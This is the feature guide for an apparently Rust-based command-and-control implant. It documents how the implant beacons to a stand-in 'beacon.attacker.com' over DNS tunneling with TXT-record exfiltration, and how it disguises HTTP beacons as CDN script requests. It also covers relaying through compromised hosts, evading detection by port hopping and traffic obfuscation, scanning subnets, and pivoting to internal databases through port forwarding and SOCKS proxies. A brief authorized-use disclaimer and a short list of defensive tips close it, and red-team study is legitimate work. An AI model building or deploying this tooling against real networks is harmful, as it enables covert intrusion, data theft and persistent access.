# 🚀 Advanced Agent Features - Complete Guide

**Version:** 0.2.0 (Enhanced)  
**Status:** Implementation Complete  
**Last Updated:** 2024-11-05

---

## 📋 Table of Contents

1. [Network Connectivity Options](#network-connectivity-options)
2. [Port Management](#port-management)
3. [Advanced Configuration](#advanced-configuration)
4. [Failover Mechanisms](#failover-mechanisms)
5. [Operational Security](#operational-security)
6. [Examples and Usage](#examples-and-usage)

---

## 🌐 Network Connectivity Options

### **1. Direct TLS Connection** ⚡
```rust
// Basic secure connection
ConnectionMethod::DirectTLS {
    url: "api.yourdomain.com".to_string(),
    port: 8000,
}
```

**Features:**
- ✅ TLS 1.3 encryption
- ✅ WebSocket over TLS
- ✅ Fastest method
- ⚠️ Requires direct network access

**Use Case:** Internal networks, cloud endpoints

---

### **2. Proxy Support** 🔧

```rust
// Connect through corporate proxy
ConnectionMethod::ViaProxy {
    proxy: ProxyConfig {
        proxy_url: "proxy.corp.com:8080".to_string(),
        auth_type: ProxyAuthType::Basic,
        username: Some("domain\\user".to_string()),
        password: Some("password".to_string()),
        no_proxy_hosts: vec!["localhost".to_string()],
    },
    target_url: "api.yourdomain.com".to_string(),
    target_port: 443,
}
```

**Features:**
- ✅ SOCKS proxy support
- ✅ HTTP proxy support
- ✅ Authentication (Basic, NTLM, Digest)
- ✅ Proxy auto-discovery

**Use Case:** Corporate networks with mandatory proxy

---

### **3. DNS Tunneling** 📡

```rust
// Tunnel over DNS queries
ConnectionMethod::ViaDNS {
    domain: "beacon.attacker.com".to_string(),
    dns_server: "8.8.8.8".to_string(),
}
```

**Features:**
- ✅ Base32/Base64/Hex encoding
- ✅ TXT record exfiltration
- ✅ A record responses
- ✅ Query randomization

**Benefits:**
```
Before: Normal DNS query blocked by firewall
After:  Command encoded in DNS query "4d5a90.beacon.attacker.com"
        Response in TXT record "Q0VVQQ=="
```

**Use Case:** Networks allowing only DNS egress

---

### **4. HTTP/HTTPS Beaconing** 🌐

```rust
// Standard HTTP beacon
ConnectionMethod::ViaHTTP {
    url: "http://cdn.example.com/update".to_string(),
    port: 80,
}
```

**Features:**
- ✅ Mimics normal web traffic
- ✅ User-agent rotation
- ✅ Header randomization
- ✅ Payload padding
- ✅ HTTP/2 support

**Evasion:**
```
GET /jquery-3.6.0.min.js HTTP/1.1
Host: legitimate-cdn.com
User-Agent: Mozilla/5.0...
[Encoded command in payload]
```

**Use Case:** Bypass WebSocket-specific filters

---

### **5. SSH Tunneling** 🔐

```rust
// SSH port forwarding
ConnectionMethod::ViaSSH {
    host: "jump.corp.com".to_string(),
    user: "admin".to_string(),
    key_path: "/home/agent/.ssh/id_rsa".to_string(),
    forward_port: 8000,
}
```

**Features:**
- ✅ SSH key authentication
- ✅ Port forwarding
- ✅ Legitimate protocol abuse
- ✅ Compressed tunnels

**Use Case:** Jump hosts, legitimate admin networks

---

### **6. P2P Relay Network** 🔗

```rust
// Mesh network through compromised hosts
ConnectionMethod::ViaP2P {
    peer_id: "agent_002".to_string(),
    relay_nodes: vec![
        "agent_001:9000".to_string(),
        "agent_003:9001".to_string(),
        "agent_005:9002".to_string(),
    ],
}
```

**Features:**
- ✅ Decentralized communication
- ✅ Automatic relay selection
- ✅ Redundant paths
- ✅ No central C2 dependency

**Topology:**
```
Agent A ─── Agent B ─── Agent C ─── C2 Server
(Compromised) (Relay)   (Relay)
```

**Use Case:** Resilient C2, lateral movement

---

## 🔌 Port Management

### **Port Scanner** 🔍

```rust
// Scan for open ports on target
let scanner = PortScanner::new("192.168.1.1".to_string(), 5000)
    .with_common_ports();

let results = scanner.scan().await;
for (port, is_open) in results {
    if is_open {
        println!("Port {} is open", port);
    }
}
```

**Scanned Ports:**
```
Web:        80, 443, 8000, 8080, 8443, 3000, 5000
SSH/RDP:    22, 3389, 5985, 5986
Databases:  3306, 5432, 1433, 27017, 6379
Mail:       25, 110, 143, 465, 587, 993, 995
DNS/DHCP:   53, 67, 68
Other:      123, 161, 162, 389, 636, 88, 5900
```

---

### **Network Enumeration** 🌍

```rust
// Scan subnet for active hosts
let enumerator = NetworkEnumerator::new(
    "192.168.1.0/24".to_string(),
    5000
);

let alive_hosts = enumerator.scan_subnet().await;
for host in alive_hosts {
    println!("Found active host: {}", host);
}
```

**Output:**
```
Found active host: 192.168.1.1
Found active host: 192.168.1.10
Found active host: 192.168.1.50
Found active host: 192.168.1.100
```

---

### **Port Forwarding** 🔄

```rust
// Local port forwarding (remote service → local)
let tunnel = PortForwardingTunnel::new(
    8080,                          // Listen on 8080
    "database.internal.corp".to_string(),
    3306,                          // Forward to internal DB
    ProtocolType::TCP,
);

tunnel.establish().await?;
```

**Usage:**
```
Agent listens on 8080
↓
Forwards to database.internal.corp:3306
↓
Attacker connects: mysql -h 127.0.0.1 -P 8080
```

---

### **SOCKS Proxy** 🔀

```rust
// Create SOCKS5 proxy for traffic routing
let proxy = SOCKSProxy::new(1080, SOCKSVersion::V5);
proxy.start().await?;
```

**Configuration:**
```bash
# Use as proxy for any tool
curl -x socks5://127.0.0.1:1080 http://internal-service.com

# Browser proxy settings:
# SOCKS Host: 127.0.0.1
# Port: 1080
```

---

### **Port Hopping** 🎯

```rust
// Switch ports periodically for evasion
let mut hopper = PortHopper::new(
    8000,
    vec![8001, 8002, 8003, 8004],
);

// Change port every 5 minutes
loop {
    let port = hopper.next_port();
    // Listen on port...
    tokio::time::sleep(Duration::from_secs(300)).await;
}
```

**Effect:**
```
Time 0:00    - Listening on 8000
Time 5:00    - Switch to 8001
Time 10:00   - Switch to 8002
Time 15:00   - Switch to 8003
Time 20:00   - Cycle back to 8000

Defender sees: Multiple ports with traffic
Detection harder: Different port each check
```

---

### **Multi-Port Listener** 📡

```rust
// Listen on multiple ports simultaneously
let listener = MultiPortListener::new(vec![
    80,    // HTTP
    443,   // HTTPS
    8000,  // Custom
    8443,  // Custom HTTPS
]);

listener.start_listening().await?;
```

---

## ⚙️ Advanced Configuration

### **Complete Network Configuration Example**

```rust
let config = NetworkConfig {
    server_url: "https://api.yourdomain.com".to_string(),
    
    // Primary proxy
    proxy: Some(ProxyConfig {
        proxy_url: "proxy.corp.com:8080".to_string(),
        auth_type: ProxyAuthType::Basic,
        username: Some("user".to_string()),
        password: Some("pass".to_string()),
        no_proxy_hosts: vec!["localhost".to_string()],
    }),
    
    // DNS tunnel as fallback
    dns_tunnel: Some(DnsTunnelConfig {
        domain: "beacon.attacker.com".to_string(),
        dns_server: "8.8.8.8".to_string(),
        record_type: DnsRecordType::TXT,
        encoding: DnsEncoding::Base64,
    }),
    
    // Port configuration
    ports: PortConfig {
        primary_port: 8000,
        fallback_ports: vec![8001, 8002, 8443, 443, 80],
        dynamic_port_range: (9000, 9100),
        port_hopping: true,
        port_scan_timeout: 5000,
    },
    
    // Failover methods in priority order
    failover: vec![
        ConnectionMethod::DirectTLS {
            url: "api.yourdomain.com".to_string(),
            port: 443,
        },
        ConnectionMethod::ViaProxy {
            proxy: proxy_config,
            target_url: "api.yourdomain.com".to_string(),
            target_port: 443,
        },
        ConnectionMethod::ViaDNS {
            domain: "beacon.attacker.com".to_string(),
            dns_server: "8.8.8.8".to_string(),
        },
        ConnectionMethod::ViaHTTP {
            url: "http://cdn.example.com".to_string(),
            port: 80,
        },
    ],
    
    // Traffic obfuscation
    obfuscation: ObfuscationConfig {
        enabled: true,
        techniques: vec![
            ObfuscationTechnique::UserAgentRotation,
            ObfuscationTechnique::HeaderRandomization,
            ObfuscationTechnique::TrafficPadding,
            ObfuscationTechnique::TimingVariation,
        ],
        traffic_padding: true,
        random_delays: (100, 500), // 100-500ms random delay
        user_agent_rotation: true,
    },
};
```

---

## 🔄 Failover Mechanisms

### **Automatic Fallback Chain**

```
Try Method 1 (DirectTLS)
  ↓ Fails
Try Method 2 (Via Proxy)
  ↓ Fails
Try Method 3 (Via DNS)
  ↓ Fails
Try Method 4 (Via HTTP)
  ↓ Fails
  ↓ Success ✅
```

### **Multi-Beacon Implementation**

```rust
let mut beacon = MultiBeacon::new(config);

// Attempts connection with fallover
match beacon.connect().await {
    Ok(connection_method) => {
        println!("Connected via: {}", connection_method);
    }
    Err(e) => {
        println!("All connection methods failed: {}", e);
    }
}
```

---

## 🛡️ Operational Security

### **Traffic Obfuscation Techniques**

#### 1. **User-Agent Rotation**
```
Request 1: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Request 2: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)
Request 3: Mozilla/5.0 (X11; Linux x86_64)
```

#### 2. **Header Randomization**
```
Request 1: Accept-Encoding: gzip, deflate
Request 2: Accept-Language: en-US,en;q=0.9
Request 3: Accept: */*
```

#### 3. **Payload Padding**
```
Real payload: 256 bytes
Padded payload: 512 bytes (256 + 256 random)
Detector sees: Variable sizes
```

#### 4. **Timing Variation**
```
Beacon interval: 30 seconds ± random(1-10 seconds)
Normal pattern: Irregular, not fixed interval
```

---

## 📚 Examples and Usage

### **Example 1: Corporate Network with Proxy**

```rust
// Configuration for corporate environment
let config = NetworkConfig {
    server_url: "https://internal-api.company.com".to_string(),
    proxy: Some(ProxyConfig {
        proxy_url: "proxy.company.com:8080".to_string(),
        auth_type: ProxyAuthType::NTLM,
        username: Some("COMPANY\\user".to_string()),
        password: Some("SecurePassword123".to_string()),
        no_proxy_hosts: vec![
            "localhost".to_string(),
            "127.0.0.1".to_string(),
        ],
    }),
    ports: PortConfig {
        primary_port: 443,
        fallback_ports: vec![8443, 80, 8080],
        port_hopping: false,
        ..Default::default()
    },
    ..Default::default()
};
```

---

### **Example 2: Restricted Network with DNS Fallback**

```rust
// Configuration for network allowing only DNS
let config = NetworkConfig {
    failover: vec![
        ConnectionMethod::ViaHTTP { /* ... */ },
        ConnectionMethod::ViaDNS {
            domain: "beacon.attacker.com".to_string(),
            dns_server: "1.1.1.1".to_string(),
        },
    ],
    dns_tunnel: Some(DnsTunnelConfig {
        domain: "beacon.attacker.com".to_string(),
        dns_server: "1.1.1.1".to_string(),
        record_type: DnsRecordType::TXT,
        encoding: DnsEncoding::Base64,
    }),
    ..Default::default()
};
```

---

### **Example 3: Port Scanning and Enumeration**

```rust
// Reconnaissance script
async fn reconnaissance(target: &str) -> Result<(), Box<dyn std::error::Error>> {
    // Scan open ports
    let scanner = PortScanner::new(target.to_string(), 5000)
        .with_common_ports();
    
    let ports = scanner.scan().await;
    println!("Open ports on {}: {:?}", target, 
        ports.iter()
            .filter_map(|(p, open)| if *open { Some(*p) } else { None })
            .collect::<Vec<_>>()
    );

    // Enumerate subnet
    let enumerator = NetworkEnumerator::new(
        "192.168.1.0/24".to_string(),
        5000
    );
    
    let hosts = enumerator.scan_subnet().await;
    println!("Alive hosts in subnet: {:?}", hosts);

    Ok(())
}
```

---

### **Example 4: Port Forwarding for Database Access**

```rust
// Setup tunnel to internal database
async fn setup_db_tunnel() -> Result<(), Box<dyn std::error::Error>> {
    let tunnel = PortForwardingTunnel::new(
        3306,  // Listen locally
        "db-internal.corp".to_string(),
        3306,  // Remote MySQL port
        ProtocolType::TCP,
    );

    tunnel.establish().await?;
    
    // Now attacker can connect:
    // mysql -h 127.0.0.1 -P 3306
    
    Ok(())
}
```

---

### **Example 5: SOCKS Proxy for Network Access**

```rust
// Setup SOCKS5 proxy
async fn setup_socks_proxy() -> Result<(), Box<dyn std::error::Error>> {
    let proxy = SOCKSProxy::new(1080, SOCKSVersion::V5);
    proxy.start().await?;
    
    // Use with any tool:
    // curl -x socks5://127.0.0.1:1080 http://internal-service
    
    Ok(())
}
```

---

## 📊 Feature Comparison Matrix

| Feature | Internal | Proxy | DNS | HTTP | SSH | P2P |
|---------|----------|-------|-----|------|-----|-----|
| **Speed** | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐ | ⭐⭐⭐ | ⭐⭐⭐ | ⭐⭐⭐ |
| **Stealth** | ⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐ |
| **Reliability** | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐ |
| **Bandwidth** | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐ | ⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ |
| **Evasion** | ⭐ | ⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐ |

---

## 🎯 Recommended Deployment Scenarios

| Scenario | Recommended | Fallback 1 | Fallback 2 |
|----------|------------|-----------|-----------|
| **Internal Network** | DirectTLS | ViaProxy | ViaHTTP |
| **Corporate** | ViaProxy | DirectTLS | ViaDNS |
| **Restricted Egress** | ViaDNS | ViaHTTP | ViaSSH |
| **Jump Host** | ViaSSH | DirectTLS | ViaProxy |
| **High Security** | P2P Relay | ViaDNS | ViaHTTP |
| **Cloud/Public** | DirectTLS | ViaHTTP | ViaProxy |

---

## 📝 Security Notes

⚠️ **Educational Purpose Only**

This framework is designed for:
- Authorized security testing
- Red team exercises
- Penetration testing engagements
- Security research and education

All usage must comply with:
- Local laws and regulations
- Company security policies
- Written authorization from system owners
- Ethical hacking guidelines

---

## 🔒 Defensive Recommendations

System administrators should:

1. **Monitor network traffic**
   - Detect DNS tunneling patterns
   - Monitor SOCKS proxy usage
   - Track unusual outbound connections

2. **Implement DPI (Deep Packet Inspection)**
   - Detect encrypted C2 patterns
   - Block suspicious protocols
   - Enforce TLS inspection

3. **Network segmentation**
   - Restrict outbound access
   - Whitelist known destinations
   - Monitor inter-segment traffic

4. **Behavioral analysis**
   - Detect beaconing patterns
   - Identify suspicious processes
   - Track network anomalies

---

**Complete agent implementation ready for deployment!** 🚀
